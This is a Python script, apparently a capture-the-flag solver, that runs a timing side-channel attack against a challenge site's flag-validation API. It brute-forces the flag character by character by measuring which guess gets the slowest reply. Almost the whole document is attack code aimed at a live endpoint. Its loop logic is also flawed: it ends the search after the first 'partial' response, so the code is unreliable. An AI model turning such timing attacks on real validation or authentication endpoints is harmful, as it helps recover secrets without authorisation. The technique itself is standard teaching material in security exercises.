import requests
import string
import time

URL = "https://sofia-challenge.vercel.app/api/validate"

# Simple charset
CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_{}"

recovered = ""

print("="*60)
print("TIMING ATTACK - Finding flag character by character")
print("="*60)
print("How it works: Correct characters cause delays!")
print("="*60 + "\n")

while True:
    print(f"Current progress: {recovered}")
    print(f"Testing {len(CHARSET)} characters...\n")
    
    best_char = None
    best_time = 0
    
    for char in CHARSET:
        guess = recovered + char
        
        # Measure response time
        start = time.time()
        try:
            r = requests.post(URL, json={"flag": guess}, timeout=10)
            elapsed = time.time() - start
            
            print(f"  {guess:<20} -> {elapsed:.3f}s", end="")
            
            # Check response
            data = r.json()
            if data.get("status") == "success":
                print(" ✓ FLAG FOUND!")
                recovered += char
                best_char = None
                break
            elif data.get("status") == "partial":
                print(f" ✓ Partial match!")
                recovered += char
                best_char = None
                break
            else:
                print()
            
            # Track slowest response
            if elapsed > best_time:
                best_time = elapsed
                best_char = char
                
        except Exception as e:
            print(f" ✗ Error: {e}")
            continue
    
    # If we found the flag, stop
    if best_char is None:
        break
    
    # Add the slowest character (most likely correct)
    if best_char:
        recovered += best_char
        print(f"\n→ Added '{best_char}' (took {best_time:.3f}s)\n")

print("\n" + "="*60)
print(f"🎉 FINAL FLAG: {recovered}")
print("="*60)